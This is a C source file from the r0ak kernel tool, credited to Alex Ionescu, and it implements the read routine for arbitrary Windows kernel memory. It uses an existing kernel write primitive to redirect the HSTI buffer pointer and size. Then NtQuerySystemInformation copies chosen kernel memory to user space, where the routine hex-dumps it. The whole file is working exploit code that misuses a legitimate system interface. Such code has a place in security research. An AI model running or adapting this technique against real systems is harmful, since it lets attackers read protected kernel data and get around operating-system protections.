/*++

Copyright (c) Alex Ionescu.  All rights reserved.

Module Name:

    r0akrd.c

Abstract:

    This module implements read capabilities for r0ak

Author:

    Alex Ionescu (@aionescu) 21-Jul-2018 - First public version

Environment:

    User mode only.

--*/

#include "r0ak.h"

_Success_(return != 0)
BOOL
CmdReadKernel (
    _In_ PKERNEL_EXECUTE KernelExecute,
    _In_ PVOID KernelAddress,
    _In_ ULONG ValueSize
    )
{
    BOOL b;
    NTSTATUS status;
    PVOID userData;

    //
    // First, set the size that the user wants
    //
    printf("[+] Setting size to                                      0x%.16lX\n",
           ValueSize);
    b = CmdWriteKernel(KernelExecute, g_HstiBufferSize, ValueSize);
    if (b == FALSE)
    {
        printf("[-] Fail to set size\n");
        return b;
    }

    //
    // Then, set the pointer -- our write is 32-bits so we do it in 2 steps
    //
    printf("[+] Setting pointer to                                   0x%.16p\n",
           KernelAddress);
    b = CmdWriteKernel(KernelExecute,
                        g_HstiBufferPointer,
                        (ULONG_PTR)KernelAddress & 0xFFFFFFFF);
    if (b == FALSE)
    {
        printf("[-] Fail to set lower pointer bits\n");
        return b;
    }
    b = CmdWriteKernel(KernelExecute,
                        (PVOID)((ULONG_PTR)g_HstiBufferPointer + 4),
                        (ULONG_PTR)KernelAddress >> 32);
    if (b == FALSE)
    {
        printf("[-] Fail to set lower pointer bits\n");
        return b;
    }

    //
    // Allocate a buffer for the data in user space
    //
    userData = VirtualAlloc(NULL,
                            ValueSize,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE);
    if (userData == NULL)
    {
        printf("[-] Failed to allocate user mode buffer\n");
        return FALSE;
    }

    //
    // Now do the read by abusing the HSTI buffers
    //
    status = NtQuerySystemInformation(
        SystemHardwareSecurityTestInterfaceResultsInformation,
        userData,
        ValueSize,
        NULL);
    if (!NT_SUCCESS(status))
    {
        printf("[-] Failed to read kernel data\n");
    }
    else
    {
        DumpHex(userData, ValueSize);
    }

    //
    // Free the buffer and exit
    //
    VirtualFree(userData, 0, MEM_RELEASE);
    return NT_SUCCESS(status);
}

